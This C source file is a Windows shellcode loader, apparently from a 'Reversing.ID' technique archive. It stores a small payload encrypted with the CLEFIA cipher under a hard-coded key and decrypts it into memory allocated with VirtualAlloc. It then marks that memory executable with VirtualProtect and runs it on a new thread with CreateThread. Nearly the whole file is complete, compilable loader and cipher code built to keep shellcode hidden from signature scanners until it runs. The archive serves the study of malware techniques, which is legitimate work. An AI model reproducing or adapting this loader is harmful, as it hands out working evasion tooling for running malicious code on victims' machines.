/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory
    implementing CLEFIA algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    CLEFIA algorithm
    - permission: VirtualProtect
    - execution:  CreateThread

Reference:
    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/CLEFIA/CLEFIA.c

Note:
    - key size: 128-bit
    - mode: CBC (Cipher Block Chaining)
    - IV is appended into the shellcode
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

/* ************************ CONFIGURATION & SEED ************************ */
#define KEYSIZE         128
#define KEYSIZEB        16
#define BLOCKSIZE       128
#define BLOCKSIZEB      16

#define clefia_mul4(x)  (clefia_mul2(clefia_mul2((x))))
#define clefia_mul6(x)  (clefia_mul2((x)) ^ clefia_mul4((x)))
#define clefia_mul8(x)  (clefia_mul2(clefia_mul4((x))))
#define clefia_mulA(x)  (clefia_mul2((x)) ^ clefia_mul8((x)))


/* Key generation */
uint8_t S0[256] = 
{
    0x57U, 0x49U, 0xD1U, 0xC6U, 0x2FU, 0x33U, 0x74U, 0xFBU,
    0x95U, 0x6DU, 0x82U, 0xEAU, 0x0EU, 0xB0U, 0xA8U, 0x1CU,
    0x28U, 0xD0U, 0x4BU, 0x92U, 0x5CU, 0xEEU, 0x85U, 0xB1U,
    0xC4U, 0x0AU, 0x76U, 0x3DU, 0x63U, 0xF9U, 0x17U, 0xAFU,
    0xBFU, 0xA1U, 0x19U, 0x65U, 0xF7U, 0x7AU, 0x32U, 0x20U,
    0x06U, 0xCEU, 0xE4U, 0x83U, 0x9DU, 0x5BU, 0x4CU, 0xD8U,
    0x42U, 0x5DU, 0x2EU, 0xE8U, 0xD4U, 0x9BU, 0x0FU, 0x13U,
    0x3CU, 0x89U, 0x67U, 0xC0U, 0x71U, 0xAAU, 0xB6U, 0xF5U,
    0xA4U, 0xBEU, 0xFDU, 0x8CU, 0x12U, 0x00U, 0x97U, 0xDAU,
    0x78U, 0xE1U, 0xCFU, 0x6BU, 0x39U, 0x43U, 0x55U, 0x26U,
    0x30U, 0x98U, 0xCCU, 0xDDU, 0xEBU, 0x54U, 0xB3U, 0x8FU,
    0x4EU, 0x16U, 0xFAU, 0x22U, 0xA5U, 0x77U, 0x09U, 0x61U,
    0xD6U, 0x2AU, 0x53U, 0x37U, 0x45U, 0xC1U, 0x6CU, 0xAEU,
    0xEFU, 0x70U, 0x08U, 0x99U, 0x8BU, 0x1DU, 0xF2U, 0xB4U,
    0xE9U, 0xC7U, 0x9FU, 0x4AU, 0x31U, 0x25U, 0xFEU, 0x7CU,
    0xD3U, 0xA2U, 0xBDU, 0x56U, 0x14U, 0x88U, 0x60U, 0x0BU,
    0xCDU, 0xE2U, 0x34U, 0x50U, 0x9EU, 0xDCU, 0x11U, 0x05U,
    0x2BU, 0xB7U, 0xA9U, 0x48U, 0xFFU, 0x66U, 0x8AU, 0x73U,
    0x03U, 0x75U, 0x86U, 0xF1U, 0x6AU, 0xA7U, 0x40U, 0xC2U,
    0xB9U, 0x2CU, 0xDBU, 0x1FU, 0x58U, 0x94U, 0x3EU, 0xEDU,
    0xFCU, 0x1BU, 0xA0U, 0x04U, 0xB8U, 0x8DU, 0xE6U, 0x59U,
    0x62U, 0x93U, 0x35U, 0x7EU, 0xCAU, 0x21U, 0xDFU, 0x47U,
    0x15U, 0xF3U, 0xBAU, 0x7FU, 0xA6U, 0x69U, 0xC8U, 0x4DU,
    0x87U, 0x3BU, 0x9CU, 0x01U, 0xE0U, 0xDEU, 0x24U, 0x52U,
    0x7BU, 0x0CU, 0x68U, 0x1EU, 0x80U, 0xB2U, 0x5AU, 0xE7U,
    0xADU, 0xD5U, 0x23U, 0xF4U, 0x46U, 0x3FU, 0x91U, 0xC9U,
    0x6EU, 0x84U, 0x72U, 0xBBU, 0x0DU, 0x18U, 0xD9U, 0x96U,
    0xF0U, 0x5FU, 0x41U, 0xACU, 0x27U, 0xC5U, 0xE3U, 0x3AU,
    0x81U, 0x6FU, 0x07U, 0xA3U, 0x79U, 0xF6U, 0x2DU, 0x38U,
    0x1AU, 0x44U, 0x5EU, 0xB5U, 0xD2U, 0xECU, 0xCBU, 0x90U,
    0x9AU, 0x36U, 0xE5U, 0x29U, 0xC3U, 0x4FU, 0xABU, 0x64U,
    0x51U, 0xF8U, 0x10U, 0xD7U, 0xBCU, 0x02U, 0x7DU, 0x8EU
};

uint8_t S1[256] = 
{
    0x6CU, 0xDAU, 0xC3U, 0xE9U, 0x4EU, 0x9DU, 0x0AU, 0x3DU,
    0xB8U, 0x36U, 0xB4U, 0x38U, 0x13U, 0x34U, 0x0CU, 0xD9U,
    0xBFU, 0x74U, 0x94U, 0x8FU, 0xB7U, 0x9CU, 0xE5U, 0xDCU,
    0x9EU, 0x07U, 0x49U, 0x4FU, 0x98U, 0x2CU, 0xB0U, 0x93U,
    0x12U, 0xEBU, 0xCDU, 0xB3U, 0x92U, 0xE7U, 0x41U, 0x60U,
    0xE3U, 0x21U, 0x27U, 0x3BU, 0xE6U, 0x19U, 0xD2U, 0x0EU,
    0x91U, 0x11U, 0xC7U, 0x3FU, 0x2AU, 0x8EU, 0xA1U, 0xBCU,
    0x2BU, 0xC8U, 0xC5U, 0x0FU, 0x5BU, 0xF3U, 0x87U, 0x8BU,
    0xFBU, 0xF5U, 0xDEU, 0x20U, 0xC6U, 0xA7U, 0x84U, 0xCEU,
    0xD8U, 0x65U, 0x51U, 0xC9U, 0xA4U, 0xEFU, 0x43U, 0x53U,
    0x25U, 0x5DU, 0x9BU, 0x31U, 0xE8U, 0x3EU, 0x0DU, 0xD7U,
    0x80U, 0xFFU, 0x69U, 0x8AU, 0xBAU, 0x0BU, 0x73U, 0x5CU,
    0x6EU, 0x54U, 0x15U, 0x62U, 0xF6U, 0x35U, 0x30U, 0x52U,
    0xA3U, 0x16U, 0xD3U, 0x28U, 0x32U, 0xFAU, 0xAAU, 0x5EU,
    0xCFU, 0xEAU, 0xEDU, 0x78U, 0x33U, 0x58U, 0x09U, 0x7BU,
    0x63U, 0xC0U, 0xC1U, 0x46U, 0x1EU, 0xDFU, 0xA9U, 0x99U,
    0x55U, 0x04U, 0xC4U, 0x86U, 0x39U, 0x77U, 0x82U, 0xECU,
    0x40U, 0x18U, 0x90U, 0x97U, 0x59U, 0xDDU, 0x83U, 0x1FU,
    0x9AU, 0x37U, 0x06U, 0x24U, 0x64U, 0x7CU, 0xA5U, 0x56U,
    0x48U, 0x08U, 0x85U, 0xD0U, 0x61U, 0x26U, 0xCAU, 0x6FU,
    0x7EU, 0x6AU, 0xB6U, 0x71U, 0xA0U, 0x70U, 0x05U, 0xD1U,
    0x45U, 0x8CU, 0x23U, 0x1CU, 0xF0U, 0xEEU, 0x89U, 0xADU,
    0x7AU, 0x4BU, 0xC2U, 0x2FU, 0xDBU, 0x5AU, 0x4DU, 0x76U,
    0x67U, 0x17U, 0x2DU, 0xF4U, 0xCBU, 0xB1U, 0x4AU, 0xA8U,
    0xB5U, 0x22U, 0x47U, 0x3AU, 0xD5U, 0x10U, 0x4CU, 0x72U,
    0xCCU, 0x00U, 0xF9U, 0xE0U, 0xFDU, 0xE2U, 0xFEU, 0xAEU,
    0xF8U, 0x5FU, 0xABU, 0xF1U, 0x1BU, 0x42U, 0x81U, 0xD6U,
    0xBEU, 0x44U, 0x29U, 0xA6U, 0x57U, 0xB9U, 0xAFU, 0xF2U,
    0xD4U, 0x75U, 0x66U, 0xBBU, 0x68U, 0x9FU, 0x50U, 0x02U,
    0x01U, 0x3CU, 0x7FU, 0x8DU, 0x1AU, 0x88U, 0xBDU, 0xACU,
    0xF7U, 0xE4U, 0x79U, 0x96U, 0xA2U, 0xFCU, 0x6DU, 0xB2U,
    0x6BU, 0x03U, 0xE1U, 0x2EU, 0x7DU, 0x14U, 0x95U, 0x1DU
};

/* context and configuration */
typedef struct 
{
    uint32_t bits;
    int32_t  round;
    uint8_t  rkeys[8 * 26 + 16];    /* 8 bytes x 26 rounds (max) + whitening keys */
} clefia_t;


/* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
void key_setup(clefia_t * config, uint8_t secret[KEYSIZEB], uint32_t bits);

void byte_copy(uint8_t *dst, const uint8_t * src, uint32_t bytelen);
void byte_xor(uint8_t * dst, const uint8_t * a, const uint8_t * b, uint32_t bytelen);

uint8_t clefia_mul2(uint8_t x);
void clefia_f0_xor(uint8_t * dst, const uint8_t * src, const uint8_t * rk);
void clefia_f1_xor(uint8_t * dst, const uint8_t * src, const uint8_t * rk);
void clefia_gfn4(uint8_t * y, const uint8_t * x, const uint8_t * rk, int32_t round);
void clefia_gfn8(uint8_t * y, const uint8_t * x, const uint8_t * rk, int32_t round);
void clefia_gfn4_inv(uint8_t * y, const uint8_t * x, const uint8_t * rk, int32_t round);
void clefia_double_swap(uint8_t * lk);
void clefia_con_set(uint8_t * con, const uint8_t * iv, int32_t lk);


/* *************************** HELPER FUNCTIONS *************************** */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}


void block_decrypt (clefia_t * config, uint8_t val[BLOCKSIZEB])
{
    uint8_t   rin[BLOCKSIZEB], rout[BLOCKSIZEB];
    uint8_t * rkeys = config->rkeys;

    byte_copy(rin, val, BLOCKSIZEB);

    byte_xor(rin +  4, rin +  4, rkeys + config->round * 8 +  8, 4);    /* initial key whitening */
    byte_xor(rin + 12, rin + 12, rkeys + config->round * 8 + 12, 4);
    rkeys += 8;

    clefia_gfn4_inv(rout, rin, rkeys, config->round);                   /* GFN_{4, r} */

    byte_copy(val, rout, BLOCKSIZEB);

    byte_xor(val +  4, val +  4, rkeys - 8, 4);                     /* final key whitening */
    byte_xor(val + 12, val + 12, rkeys - 4, 4);
}

// CLEFIA decryption with CBC
void decrypt(uint8_t * data, uint32_t size, uint8_t key[KEYSIZEB], uint8_t iv[BLOCKSIZEB])
{
    clefia_t config;
    uint32_t  i;
    uint8_t   prev_block[BLOCKSIZEB];
    uint8_t   cipher_block[BLOCKSIZEB];

    // setup configuration
    key_setup(&config, key, KEYSIZE);

    memcpy(prev_block, iv, BLOCKSIZEB);

    for (i = 0; i < size; i += BLOCKSIZEB)
    {
        // copy to temporary block
        memcpy(cipher_block, &data[i], BLOCKSIZEB);

        // decrypt the block
        block_decrypt(&config, &data[i]);

        // XOR the previous ciphertext with current ciphertext block
        xor_block(&data[i], &data[i], prev_block);

        // copy the current ciphertext as previous block
        memcpy(prev_block, cipher_block, BLOCKSIZEB); 
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    // IV is embedded within, so we need to mark both payload and IV
    uint8_t     payload []  = { 
        0x6e, 0x4f, 0xc0, 0x21, 0x6d, 0x2a, 0x93, 0x0f, 0x0f, 0x8a, 0xc9, 0xf2, 0x2b, 0xa6, 0xb1, 0x88,
        0x14, 0x90, 0xd0, 0xf6, 0xf6, 0xf4, 0x24, 0xe5, 0xc6, 0xd1, 0xb0, 0xdc, 0x1d, 0x13, 0x42, 0xdf,
        0x37, 0x08, 0xb9, 0x89, 0xc3, 0xba, 0x2b, 0x53, 0xd8, 0x51, 0xf1, 0xc0, 0x25, 0x9f, 0x36, 0xab
    };
    uint32_t    payload_len = 32;
    uint8_t*    iv = &payload[payload_len];

    // secret-key 16-bytes or 128-bit
    uint8_t     key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key, iv);
    
    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}


/* ********************* INTERNAL FUNCTIONS IMPLEMENTATION ********************* */
// derive round-key from secret key
void key_setup (clefia_t * config, uint8_t secret[KEYSIZEB], uint32_t bits)
{
    const uint8_t iv[2] = { 0x42U, 0x8AU };    /* akar pangkat tiga dari 2 */
    uint8_t * rkeys = config->rkeys;
    uint8_t lk[16];
    uint8_t con128[4 * 60];
    int32_t i;

    /* generating CONi^(128) (0 <= i < 60, lk = 30) */
    clefia_con_set(con128, iv, 30);

    /* GFN_{4,12} (generating L from K) */
    clefia_gfn4(lk, secret, con128, 12);

    byte_copy(rkeys, secret, 8);         /* initial whitening key (WK0, WK1) */
    rkeys += 8;
    for(i = 0; i < 9; i++)
    { 
        /* round key (RKi (0 <= i < 36)) */
        byte_xor(rkeys, lk, con128 + i * 16 + (4 * 24), 16);
        if(i % 2)
            byte_xor(rkeys, rkeys, secret, 16); /* Xoring K */
        
        clefia_double_swap(lk);     /* Updating L (DoubleSwap function) */
        rkeys += 16;
    }
    byte_copy(rkeys, secret + 8, 8); /* final whitening key (WK2, WK3) */
    config->round = 18;
    config->bits  = bits;
}


/* ******************* INTERNAL FUNCTIONS IMPLEMENTATION ******************* */
/* copy data block byte by byte */
void byte_copy(uint8_t * dst, const uint8_t * src, uint32_t bytelen)
{
    while (bytelen--) *dst++ = *src++;
}

/* XOR 2 data blocks with arbitrary length */
void byte_xor(uint8_t * dst, const uint8_t * a, const uint8_t * b, uint32_t bytelen)
{
    while (bytelen--) *dst++ = *a++ ^ *b++;
}

/* multiplication over GF(2**8) (p(x) = '11d') */
uint8_t clefia_mul2(uint8_t x)
{
    if (x & 0x80U)  x ^= 0x0EU;
    return ((x << 1) | (x >> 7));
}

void clefia_f0_xor(uint8_t * dst, const uint8_t * src, const uint8_t * rk)
{
    uint8_t x[4], y[4], z[4];

    /* F0 */
    /* Key addition */
    byte_xor(x, src, rk, 4);

    /* substitution layer */
    z[0] = S0[x[0]];
    z[1] = S1[x[1]];
    z[2] = S0[x[2]];
    z[3] = S1[x[3]];

    /* diffusion layer (M0) */
    y[0] =             z[0]  ^ clefia_mul2(z[1]) ^ clefia_mul4(z[2]) ^ clefia_mul6(z[3]);
    y[1] = clefia_mul2(z[0]) ^             z[1]  ^ clefia_mul6(z[2]) ^ clefia_mul4(z[3]); 
    y[2] = clefia_mul4(z[0]) ^ clefia_mul6(z[1]) ^             z[2]  ^ clefia_mul2(z[3]); 
    y[3] = clefia_mul6(z[0]) ^ clefia_mul4(z[1]) ^ clefia_mul2(z[2]) ^             z[3]; 

    /* xor setelah F0 */
    byte_copy(dst, src, 4);
    byte_xor(dst + 4, src + 4, y, 4);
}

void clefia_f1_xor(uint8_t * dst, const uint8_t * src, const uint8_t * rk)
{
    uint8_t x[4], y[4], z[4];

    /* F1 */
    /* Key addition */
    byte_xor(x, src, rk, 4);

    /* substitution layer */
    z[0] = S1[x[0]];
    z[1] = S0[x[1]];
    z[2] = S1[x[2]];
    z[3] = S0[x[3]];

    /* diffusion layer (M0) */
    y[0] =             z[0]  ^ clefia_mul8(z[1]) ^ clefia_mul2(z[2]) ^ clefia_mulA(z[3]);
    y[1] = clefia_mul8(z[0]) ^             z[1]  ^ clefia_mulA(z[2]) ^ clefia_mul2(z[3]); 
    y[2] = clefia_mul2(z[0]) ^ clefia_mulA(z[1]) ^             z[2]  ^ clefia_mul8(z[3]); 
    y[3] = clefia_mulA(z[0]) ^ clefia_mul2(z[1]) ^ clefia_mul8(z[2]) ^             z[3]; 

    /* xor setelah F0 */
    byte_copy(dst, src, 4);
    byte_xor(dst + 4, src + 4, y, 4);
}

void clefia_gfn4(uint8_t * y, const uint8_t * x, const uint8_t * rk, int32_t round)
{
    uint8_t fin[16], fout[16];

    byte_copy(fin, x, 16);

    while (round--)
    {
        clefia_f0_xor(fout    , fin    , rk    );
        clefia_f1_xor(fout + 8, fin + 8, rk + 4);

        rk += 8;

        if (round)
        {
            byte_copy(fin     , fout + 4, 12);
            byte_copy(fin + 12, fout    , 4);
        }
    }
    byte_copy(y, fout, 16);
}

void clefia_gfn4_inv(uint8_t * y, const uint8_t * x, const uint8_t * rk, int32_t round)
{
    uint8_t fin[16], fout[16];

    rk += (round - 1) * 8;
    byte_copy(fin, x, 16);
    while (round--)
    {
        clefia_f0_xor(fout    , fin    , rk    );
        clefia_f1_xor(fout + 8, fin + 8, rk + 4);

        rk -= 8;

        if (round)
        {
            byte_copy(fin    , fout + 12,  4);
            byte_copy(fin + 4, fout     , 12);
        }
    }
    byte_copy(y, fout, 16);
}

void clefia_double_swap(uint8_t * lk)
{
    uint8_t t[16];

    t[0] = (lk[0] << 7) | (lk[1]  >> 1);
    t[1] = (lk[1] << 7) | (lk[2]  >> 1);
    t[2] = (lk[2] << 7) | (lk[3]  >> 1);
    t[3] = (lk[3] << 7) | (lk[4]  >> 1);
    t[4] = (lk[4] << 7) | (lk[5]  >> 1);
    t[5] = (lk[5] << 7) | (lk[6]  >> 1);
    t[6] = (lk[6] << 7) | (lk[7]  >> 1);
    t[7] = (lk[7] << 7) | (lk[15] & 0x7FU);

    t[ 8] = (lk[ 8] >> 7) | (lk[ 0] & 0xFEU); 
    t[ 9] = (lk[ 9] >> 7) | (lk[ 8] << 1); 
    t[10] = (lk[10] >> 7) | (lk[ 9] << 1); 
    t[11] = (lk[11] >> 7) | (lk[10] << 1); 
    t[12] = (lk[12] >> 7) | (lk[11] << 1); 
    t[13] = (lk[13] >> 7) | (lk[12] << 1); 
    t[14] = (lk[14] >> 7) | (lk[13] << 1); 
    t[15] = (lk[15] >> 7) | (lk[14] << 1); 

    byte_copy(lk, t, 16);
}

void clefia_con_set(uint8_t * con, const uint8_t * iv, int32_t lk)
{
    uint8_t t[2];
    uint8_t tmp;

    byte_copy(t, iv, 2);
    while(lk--)
    {
        con[0] = t[0] ^ 0xB7U;      /* P_16 = 0xb7e1 (natural logarithm) */
        con[1] = t[1] ^ 0xE1U;
        con[2] = ~((t[0] << 1) | (t[1] >> 7));
        con[3] = ~((t[1] << 1) | (t[0] >> 7));
        con[4] = ~t[0] ^ 0x24U;     /* Q_16 = 0x243f (circle ratio) */
        con[5] = ~t[1] ^ 0x3FU;
        con[6] = t[1];
        con[7] = t[0];
        con += 8;

        /* updating T */
        if(t[1] & 0x01U)
        {
            t[0] ^= 0xA8U;
            t[1] ^= 0x30U;
        }
        tmp  = t[0] << 7;
        t[0] = (t[0] >> 1) | (t[1] << 7);
        t[1] = (t[1] >> 1) | tmp;
    }    
}